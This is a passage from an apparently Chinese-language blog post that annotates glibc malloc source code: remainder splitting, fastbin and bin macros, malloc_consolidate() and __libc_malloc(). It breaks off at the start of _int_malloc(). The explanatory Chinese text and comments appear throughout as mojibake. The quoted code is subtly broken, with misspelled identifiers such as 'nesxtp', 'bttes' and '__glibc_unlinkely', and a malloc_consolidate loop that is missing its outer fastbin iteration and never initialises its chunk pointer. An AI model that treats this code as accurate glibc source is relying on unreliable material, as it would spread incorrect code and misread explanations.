è¿›è¡Œæ‹†åˆ†ï¼Œåˆé€‚çš„éƒ¨åˆ†è¿”å›ç»™ç”¨æˆ·ï¼Œå‰©ä¸‹çš„éƒ¨åˆ†ï¼ˆç§°ä¸º remainderï¼‰åˆ™åŠ å…¥ unsorted bin ä¸­ã€‚åŒæ—¶ malloc_state ä¸­çš„ last_remainder ä¼šè®°å½•æœ€è¿‘æ‹†åˆ†å‡ºçš„ remainder å½“ç„¶ï¼Œè¿™ä¸ª remainder çš„å¤§å°è‡³å°‘è¦ä¸º MINSIZE ï¼Œå¦åˆ™ä¸èƒ½æ‹†åˆ†ã€‚</p><p>â€‹æ‹†åˆ† chunk çš„ä¸€ç§æƒ…å†µæ˜¯ï¼š fast bin å’Œ small bin ä¸­æ²¡æœ‰åˆé€‚çš„ chunk ã€åŒæ—¶ unsorted bin ä¸­æœ‰ä¸”åªæœ‰ä¸€ä¸ªå¯æ‹†åˆ†çš„ chunk ã€å¹¶ä¸”è¯¥ chunk æ˜¯ last remainder ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp;<span class="comment">//ç”³è¯·çš„ chunk åœ¨ small bin èŒƒå›´å†…</span></span><br><span class="line">    bck == unsorted_chunk (av) &amp;&amp;<span class="comment">//victim å¿…é¡»æ˜¯ unsorted bin ä¸­å”¯ä¸€çš„ chunk </span></span><br><span class="line">    victim == av-&gt;last_remainder &amp;&amp;<span class="comment">//victim å¿…é¡»æ˜¯ last_remainder</span></span><br><span class="line">    (<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt; (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br><span class="line">    <span class="comment">//victim è‡³å°‘è¦å¤§äº nb+MINSIZE æ‰å¯ä»¥æ‹†åˆ†</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* split and reattach remainder */</span></span><br><span class="line">    remainder_size = size - nb;</span><br><span class="line">    remainder = chunk_at_offset (victim,nb);</span><br><span class="line">    <span class="comment">//å°† remainder åŠ å…¥ unsorted bin ä¸­ï¼ŒåŒæ—¶è®°å½•ä¸º last_remainder</span></span><br><span class="line">    unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;</span><br><span class="line">    av-&gt;last_remainder = remainder;</span><br><span class="line">    remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);</span><br><span class="line">    <span class="comment">//å¦‚æœ remainder åœ¨ large bin èŒƒå›´å†…ï¼Œæ¸…ç©º fd_nextsize å’Œ bk_nextsize æŒ‡é’ˆ</span></span><br><span class="line">    <span class="keyword">if</span> (!in_smallbin_range (remainder_size)) &#123;</span><br><span class="line">        remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">        remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//è®¾ç½® remainder çš„çŠ¶æ€æ </span></span><br><span class="line">    set_head (victim,nb | PREV_INUSE |</span><br><span class="line">             (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">    set_foot (remainder, remainder_size);</span><br><span class="line">    </span><br><span class="line">    check_malloc_chunk (av,mvictim,nb);<span class="comment">//debug æ—¶ç”¨æ¥æ£€æŸ¥ chunk çŠ¶æ€</span></span><br><span class="line">    <span class="type">void</span> *p = chunk2mem (victim);<span class="comment">//è·å¾—æŒ‡å‘ user data çš„æŒ‡é’ˆï¼Œè¿”å›ç»™ç”¨æˆ·</span></span><br><span class="line">    <span class="comment">// å¦‚æœè®¾ç½®äº† perturb_typeï¼Œå°† chunk çš„ user data åˆå§‹åŒ–ä¸º peerturb_type ^ 0xff</span></span><br><span class="line">    alloc_perturb (p,byte);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2bin-ç›¸å…³æºç "><a class="markdownIt-Anchor" href="#2bin-ç›¸å…³æºç ">#</a> 2.bin ç›¸å…³æºç ï¼š</h2><h3 id="fastbin-ç›¸å…³"><a class="markdownIt-Anchor" href="#fastbin-ç›¸å…³">#</a> fastbin ç›¸å…³ï¼š</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// æ ¹æ®åºå·è·å– fastbinsY æ•°ç»„ä¸­å¯¹åº”çš„bin</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> fastbin(ar_ptr,idx) ((ar_ptr)-&gt;fastbinsY[idx])</span></span><br><span class="line"><span class="comment">//æ ¹æ® chunk å¤§å°è·å¾—ä½ç½®ã€‚å› ä¸º MINSIZE ä¸º 0x20ï¼Œå‰ä¸¤ä¸ª index æ˜¯ä¸å¯ç´¢å¼•çš„ï¼Œæ‰€ä»¥éœ€è¦å‡å»2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> fastbin_index(sz)\</span></span><br><span class="line"><span class="meta">((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å®šä¹‰äº†å±äº fast_bin çš„ chunk æœ€å¤§å€¼</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_FAST_SIZE (80 * SIZE_SZ / 4)</span></span><br><span class="line"><span class="comment">//å®šä¹‰äº† fastbinsY æ•°ç»„çš„å¤§å°</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NFASTBINS (fastbin_index (request2size (MAX_FAST_SIZE)) + 1)</span></span><br></pre></td></tr></table></figure><p>â€‹fastbinsY æ•°ç»„èµ·å§‹å¹¶æ²¡æœ‰ä¿å­˜å¤´ç»“ç‚¹ï¼Œè€Œæ˜¯åªä¿å­˜äº† malloc_chunk çš„ fd æˆå‘˜ï¼Œå› ä¸ºå…¶ä»–æˆå‘˜å¯¹äºå•é“¾è¡¨ç»“ç‚¹å¹¶æ²¡æœ‰ç”¨ï¼Œæ‰€ä»¥å°±çœç•¥äº†ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œè¿™äº› fd æŒ‡é’ˆçš„åˆå§‹å€¼ä¸º NULL ï¼Œè¡¨ç¤ºå¯¹åº”çš„ bin ä¸ºç©ºï¼Œç›´åˆ°æœ‰ chunk åŠ è¿›æ¥æ—¶ï¼Œfd æ‰ä¿å­˜ chunk çš„åœ°å€ã€‚</p><p><img data-src="https://img-blog.csdnimg.cn/direct/0c64e83715824b93b3e92b89e7b7f2b4.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><ul><li><p>FASTBIN_CONSOLIDATION_THRESHOLDï¼Œfastbin ä¸­çš„ chunk ä¸€èˆ¬ä¸ä¼šä¸å…¶ä»– chunk åˆå¹¶ã€‚ä½†å¦‚æœåˆå¹¶ä¹‹åçš„ chunk å¤§äº FASTBIN_CONSOLIDATION_THRESHOLDï¼Œå°±ä¼šè§¦å‘ malloc_consolidation () å‡½æ•°ï¼Œå°† fastbin ä¸­çš„ chunk ä¸å…¶ä»– free chunk åˆå¹¶ï¼Œç„¶åç§»åŠ¨åˆ° unsorted bin ä¸­ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> FASTBIN_CONSOLIDATION_THRESHOLD (65536UL)</span></span><br></pre></td></tr></table></figure></li><li><p>fast bin ä¸­æœ€å¤§çš„ chunk æ˜¯ç”± global_max_fast å†³å®šçš„ï¼Œè¿™ä¸ªå€¼ä¸€èˆ¬åœ¨å †åˆå§‹åŒ–çš„æ—¶å€™è®¾ç½®ã€‚å½“ç„¶åœ¨è¿è¡Œæ—¶ä¹Ÿæ˜¯å¯ä»¥è®¾ç½®çš„ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> ser_max_fast(s)\</span></span><br><span class="line"><span class="meta">global_max_fast = (((s) == 0)</span></span><br><span class="line">? SMALLBIN_WIDTH : ((s + SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK))</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> get_max_fast()global_max_fast</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="bins-ç›¸å…³"><a class="markdownIt-Anchor" href="#bins-ç›¸å…³">#</a> bins ç›¸å…³ï¼š</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ä» bins ä¸­è·å–æŒ‡å®šåºå·çš„ bin ã€‚éœ€è¦æ³¨æ„ bin 0 æ˜¯ä¸å­˜åœ¨çš„</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> bin_at(m,i)\</span></span><br><span class="line"><span class="meta">(mbinptr) (((char *) &amp;((m)-&gt;bins[((i) - 1) * 2]))\</span></span><br><span class="line"><span class="meta">- offsetof (struct malloc_chunk,fd))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// è·å¾—å½“å‰ bin çš„ä¸Šä¸€ä¸ª bin</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> next_bin(b) ((mbinptr) ((char *) (b) + (sizeof (mchunkptr) &lt;&lt; 1)))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ä¸€èˆ¬ç”¨æ¥è·å¾— bin ä¸­å¤´ç»“ç‚¹ fd æŒ‡å‘çš„ chunk æˆ–è€…bk æŒ‡å‘çš„ chunk</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> first(b)((b)-&gt;fd)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> last(b)((b)-&gt;bk)</span></span><br></pre></td></tr></table></figure><p>â€‹å¯ä»¥çœ‹åˆ° bin_at (m,i) å®å®šä¹‰ä¸­å‡å»äº† offsetof (struct malloc_chunk,fd)ï¼Œä¹Ÿå°±æ˜¯ prev_size å’Œ size æˆå‘˜çš„å¤§å°ã€‚è¿™æ˜¯å› ä¸º bins æ•°ç»„å®é™…ä¸Šåªä¿å­˜äº†åŒé“¾è¡¨çš„å¤´ç»“ç‚¹çš„ fd å’Œ bk æŒ‡é’ˆï¼Œå¦‚ä¸‹å›¾ï¼š</p><p><img data-src="https://img-blog.csdnimg.cn/direct/9b48c38704a7434ab4c737ae86cb7720.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹bins [0] å’Œ bins [1] æ˜¯ unsorted bin çš„ fd å’Œ bk æŒ‡é’ˆï¼Œbinat (1) è¿”å›çš„åº”è¯¥æ˜¯ unsorted bin çš„å¤´æŒ‡é’ˆï¼Œä½†å®é™…ä¸Šå…¶æŒ‡å‘çš„æ˜¯ bins [0] åœ°å€å‡å» offsetof (struct malloc_chunk,fd) çš„ä½ç½®ï¼Œè¿™æ ·ä½¿ç”¨å¤´ç»“ç‚¹æŒ‡é’ˆ b æ—¶ï¼Œb-&gt;fd æˆ–è€… b-&gt;bk èƒ½å¤Ÿæ­£ç¡®è®¿é—®ï¼ŒåŒæ—¶ prev_size å’Œ size å¯¹äºå¤´ç»“ç‚¹æ²¡æœ‰æ„ä¹‰ï¼Œæ‰€ä»¥å°±è¢«çœç•¥äº†ã€‚å¯¹äº binat (64) åŠä¹‹åçš„ large bin æ¥è¯´ï¼Œå› ä¸ºå¤´ç»“ç‚¹çš„ size æˆå‘˜æ²¡æœ‰æ„ä¹‰ï¼Œæ‰€ä»¥å…¶ fd_nextsize å’Œ bk_nextsize ä¹Ÿæ˜¯æ²¡æœ‰æ„ä¹‰çš„ï¼Œä¹Ÿå¯ä»¥çœç•¥ã€‚</p><p>â€‹small bin å’Œ large bin ç´¢å¼•å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// æ ¹æ® chunk å¤§å°è·å¾—å…¶åœ¨ small bin ä¸­çš„ç´¢å¼•</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> smallbin_index(sz)\</span></span><br><span class="line"><span class="meta">((SMALLBIN_WIDTH == 16 ? (((unsigned) (sz)) &gt;&gt; 4) : (((unsigned) (sz)) &gt;&gt; 3))\</span></span><br><span class="line"><span class="meta">+ SMALLBIN_CORRECTION)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// æ ¹æ® chunk å¤§å°è·å¾—å…¶åœ¨ large bin ä¸­çš„ç´¢å¼•</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> largebin_index(sz)\</span></span><br><span class="line"><span class="meta">(SIZE_SZ == 8 ? largebin_index_64 (sz)\</span></span><br><span class="line"><span class="meta">: MALLOC_ALIGNMENT == 16 ? largebin_index_32_big (sz)\</span></span><br><span class="line"><span class="meta">    : largebin_index_32 (sz))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// æ ¹æ® chunk å¤§å°è·å¾—å…¶åœ¨ bins ä¸­çš„ç´¢å¼•</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> bin_index(sz)\</span></span><br><span class="line"><span class="meta">((in_smallbin_range (sz)) ? smallbin_index (sz) : largebin_index (sz))</span></span><br></pre></td></tr></table></figure><p>â€‹è·å¾— unsorted bin ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> unsorted_chunk(M)(bin_at (M,1))</span></span><br></pre></td></tr></table></figure><p>â€‹binmap ç»“æ„åœ¨ç´¢å¼• bin çš„æ—¶å€™ä½¿ç”¨ï¼Œbinmap ä¸º malloc_state çš„æˆå‘˜ï¼Œå…¶ä¸­ä¸€ä¸ªæ¯”ç‰¹ä½è¡¨ç¤º bins ä¸­ç›¸åº”çš„ bin çŠ¶æ€ï¼Œ1 è¡¨ç¤º bin ä¸ä¸ºç©ºï¼Œ0 è¡¨ç¤ºä¸ºç©ºï¼Œè¿™æ ·èƒ½åŠ å¿«æœç´¢é€Ÿåº¦ã€‚</p><h2 id="3malloc_consolidateå‡½æ•°"><a class="markdownIt-Anchor" href="#3malloc_consolidateå‡½æ•°">#</a> 3.malloc_consolidate () å‡½æ•°ï¼š</h2><p>â€‹ç”±äº fast bin ä¸­çš„ chunk æ°¸è¿œä¸ä¼šé‡Šæ”¾ï¼Œå¯¼è‡´ç›¸é‚»çš„ free chunk æ— æ³•ä¸ä¹‹åˆå¹¶ï¼Œä»è€Œé€ æˆäº†å¤§é‡çš„å†…å­˜ç¢ç‰‡ï¼Œmalloc_consolidate () å‡½æ•°ä¸»è¦åŠŸèƒ½å°±æ˜¯æ¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚åœ¨è¾¾åˆ°æŸäº›æ¡ä»¶æ—¶ï¼Œglibc å°±ä¼šè°ƒç”¨è¯¥å‡½æ•°å°†  fast bin ä¸­çš„ chunk å–å‡ºæ¥ï¼Œä¸ç›¸é‚»çš„ free chunk åˆå¹¶ä¹‹åæ”¾å…¥ unsorted bin ï¼Œæˆ–è€…ä¸ top chunk åˆå¹¶åå½¢æˆæ–°çš„ top chunk ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">malloc_consolidate</span><span class="params">(mstate av)</span> &#123;</span><br><span class="line">    mfastbinptr* fb;<span class="comment">/* current fastbin being consolidated */</span></span><br><span class="line">    mfastbinptr* maxfb;<span class="comment">/* last fastbin (for loop control) */</span></span><br><span class="line">    mchunkptr  p;<span class="comment">/* current chunk being consolidated */</span></span><br><span class="line">    mchunkptr    nextp;<span class="comment">/* next chunk to consolidate */</span></span><br><span class="line">    mchunkptr  unsorted_bin;<span class="comment">/* bin header */</span></span><br><span class="line">    mchunkptr  first_unsorted;<span class="comment">/* chunk to link to */</span></span><br><span class="line">    </span><br><span class="line">    mchunkptrnextchunk;</span><br><span class="line">    INTERNAL_SIZE_Tsize;</span><br><span class="line">    INTERNAL_SIZE_Tnextsize;</span><br><span class="line">    INTERNAL_SIZE_Tprevsize;</span><br><span class="line">    <span class="type">int</span>nextinuse;</span><br><span class="line">    mchunkptrbck;</span><br><span class="line">    mchunkptrfwd;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* å¦‚æœ max_fast ä¸º0ï¼Œå°±è°ƒç”¨ malloc_init_state() å‡½æ•°å¯¹ av è¿›è¡Œåˆå§‹åŒ– */</span></span><br><span class="line">    <span class="keyword">if</span> (get_max_fast() != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// æ¸…æ¥š av-&gt;flags æœ‰å…³ fast bin çš„æ ‡å¿—ä½ï¼Œè¡¨ç¤ºæ‰€æœ‰ fast bin éƒ½ä¸ºç©º</span></span><br><span class="line">        clear_fastchunks(av);</span><br><span class="line">        </span><br><span class="line">        unsorted_bin = unsorted_chunk(av);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">/* Jå°† fast bin ä¸­çš„ chunk ç§»é™¤å¹¶åˆå¹¶ï¼Œç„¶åæ”¾å…¥ unsorted bin */</span></span><br><span class="line">        maxfb = &amp;fastbin(av,NFASTBINS - <span class="number">1</span>);</span><br><span class="line">        fb = &amp;fastbin(av,<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">do</span> &#123;<span class="comment">// å†…å±‚å¾ªç¯éå† fast bin ä¸­çš„æ¯ä¸€ä¸ª chunk</span></span><br><span class="line">            check_inuse_chunk(av,p);</span><br><span class="line">            nextp = p-&gt;fd;</span><br><span class="line">            </span><br><span class="line">            size = p-&gt;size &amp; ~(PREV_INUSE|NON_MAIN_ARENA);</span><br><span class="line">            nextchunk = chunk_at_offset(p,size);</span><br><span class="line">            nextsize = chunksize(nextchunk);</span><br><span class="line">            <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">                prevsize = p-&gt;prev_size;</span><br><span class="line">                size += prevsize;</span><br><span class="line">                p = chunk_at_offset(p,-((<span class="type">long</span>) prevsize));</span><br><span class="line">                unlink(av,p,bck,fwd);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// å¦‚æœä¸‹ä¸€ä¸ª chunk ä¸æ˜¯ top chunk ï¼Œå‘å‰åˆå¹¶ï¼Œå¹¶åŠ å…¥ unsorted bin</span></span><br><span class="line">            <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">                nextinuse = inuse_bit_at_offset(nextchunk,nextsize);</span><br><span class="line">                <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">                    size += nextsize;</span><br><span class="line">                    unlink(av,nextchunk,bck,fwd);</span><br><span class="line">                &#125; <span class="keyword">else</span></span><br><span class="line">                    clear_inuse_bit_at_offset(nextchunk,<span class="number">0</span>);</span><br><span class="line">                </span><br><span class="line">                first_unsorted = unsorted_bin-&gt;fd;</span><br><span class="line">                unsorted_bin-&gt;fd = p;</span><br><span class="line">                first_unsorted-&gt;bk = p;</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span> (!in_smallbin_range (size)) &#123;</span><br><span class="line">                    p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                    p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line">                set_head(p,size | PREV_INUSE);</span><br><span class="line">                p-&gt;bk = unsorted_bin;</span><br><span class="line">                p-&gt;fd = first_unsorted;</span><br><span class="line">                set_foot(p,size);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;<span class="comment">// å¦‚æœä¸‹ä¸€ä¸ª chunk æ˜¯ top chunkï¼Œå’Œ top chunk åˆå¹¶ï¼Œå½¢æˆæ–°çš„ top chunk</span></span><br><span class="line">                size += nextsize;</span><br><span class="line">                set_head(p,size | PREV_INUSE);</span><br><span class="line">                av-&gt;top = p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">while</span> ( (p = nesxtp) != <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        malloc_init_state(av);<span class="comment">// malloc åˆå§‹åŒ–</span></span><br><span class="line">        check_malloc_state(av);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-malloc-ç›¸å…³æºç "><a class="markdownIt-Anchor" href="#4-malloc-ç›¸å…³æºç ">#</a> 4. malloc () ç›¸å…³æºç ï¼š</h2><h3 id="__libc_malloc"><a class="markdownIt-Anchor" href="#__libc_malloc">#</a> __libc_malloc()ï¼š</h3><p>â€‹å› ä¸ºä½¿ç”¨äº†å® strong_alias (__libc_malloc,malloc)ï¼Œåœ¨ libc æºç ä¸­ malloc () å‡½æ•°å®é™…ä¸Šæ˜¯ __libc_malloc ()ï¼Œå®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> * __libc_malloc (<span class="type">size_t</span> bytes) &#123;</span><br><span class="line">    mstate ar_ptr;</span><br><span class="line">    <span class="type">void</span> *victim;</span><br><span class="line">    <span class="comment">// è¯»å– __malloc_hook é’©å­ï¼Œå¦‚æœæœ‰é’©å­ï¼Œåˆ™è¿è¡Œé’©å­å‡½æ•°å¹¶è¿”å›</span></span><br><span class="line">    <span class="type">void</span> *(*hook) (<span class="type">size_t</span>,<span class="type">const</span> <span class="type">void</span> *)</span><br><span class="line">        = atomic_forced_read (__malloc_hook);</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>,<span class="number">0</span>))</span><br><span class="line">        <span class="keyword">return</span> (*hook)(bytes,RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line">    </span><br><span class="line">    arena_get (ar_ptr,bytes);<span class="comment">// å¯»æ‰¾ä¸€ä¸ªåˆé€‚çš„ arena æ¥åˆ†é…å†…å­˜ã€‚</span></span><br><span class="line">    victim = _int_malloc (ar_ptr,bytes);<span class="comment">// å°è¯•è°ƒç”¨ _int_malloc() åˆ†é…å†…å­˜</span></span><br><span class="line">    <span class="comment">//  å¦‚æœæ²¡æœ‰æ‰¾åˆ°åˆé€‚çš„å†…å­˜ï¼Œå°±å°è¯•æ‰¾ä¸€ä¸ªå¯ç”¨çš„ arena (å‰ææ˜¯ ar_pter != NULL)</span></span><br><span class="line">    <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        LIBC_PROBE (memory_malloc_retry,<span class="number">1</span>,bytes);</span><br><span class="line">        ar_ptr = arena_get_retry (ar_ptr,bttes);</span><br><span class="line">        victim = _int_malloc (ar_ptr,bytes);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)<span class="comment">// å¦‚æœç”³è¯·äº† arena ï¼Œè¿˜éœ€è¦è§£é”è¯¥ arena</span></span><br><span class="line">        (<span class="type">void</span>) mutex_unlock (&amp;ar_ptr-&gt;mutex);</span><br><span class="line">    </span><br><span class="line">    assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">           ar_ptr == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">    <span class="keyword">return</span> victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="_int_malloc"><a class="markdownIt-Anchor" href="#_int_malloc">#</a> _int_malloc()ï¼š</h3><p>â€‹_int_malloc () æ˜¯å†…å­˜åˆ†é…çš„æ ¸å¿ƒå‡½æ•°ï¼Œä¸ºäº†ä»¥æœ€å¿«çš„é€Ÿåº¦æ‰¾åˆ°æœ€åˆé€‚çš„å †å—ï¼Œglibc æ ¹æ®ç”³è¯·å †å—çš„å¤§ã€å„ä¸ª bin çš„çŠ¶æ€ä»”ç»†åœ°å®‰æ’äº†åˆ†é…é¡ºåºå’Œå†…å­˜æ•´ç†åœ°æ—¶æœºã€‚å…¶å¤§æ¦‚æœç´¢é¡ºåºæ˜¯ï¼š</p><blockquote><ol><li>fast bin ï¼ˆå¯»æ‰¾å¤§å°å®Œå…¨ä¸€æ ·çš„ï¼‰</li><li>small bin ï¼ˆå¯»æ‰¾å¤§å°å®Œå…¨ä¸€æ ·çš„ï¼‰</li><li>unsorted bin ï¼ˆå¯»æ‰¾å¤§å°å®Œå…¨ä¸€æ ·çš„ï¼‰</li><li>large bin ï¼ˆå¦‚æœç”³è¯·è¾ƒå¤§çš„æ˜¯ chunk ï¼Œå¯»æ‰¾æœ€å°èƒ½æ»¡è¶³åœ°ï¼‰</li><li>bins ï¼ˆå¯»æ‰¾æœ€å°èƒ½æ»¡è¶³çš„ï¼‰</li><li>top chunk ï¼ˆåˆ‡åˆ†å‡ºåˆé€‚çš„ chunk ï¼‰</li><li>ç³»ç»Ÿå‡½æ•°åˆ†é…ã€‚</li></ol></blockquote><p>â€‹_int_malloc () å‡½æ•°å…·ä½“è¿‡ç¨‹å¦‚ä¸‹ã€‚</p><p>ï¼ˆ1ï¼‰é¦–å…ˆå®šä¹‰ä¸€äº›åˆ—æ‰€éœ€çš„å˜é‡ï¼Œå¹¶å°†ç”¨æˆ·è¯·æ±‚çš„ bytes è½¬åŒ–ä¸ºè¡¨ç¤º chunk å¤§å°çš„ nb ã€‚å¦‚æœæ²¡æœ‰åˆé€‚çš„ arena ï¼Œå°±è°ƒç”¨ sysmalloc () ï¼Œç”¨ mmap () åˆ†é… chunk å¹¶è¿”å›ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlinkely (av == <span 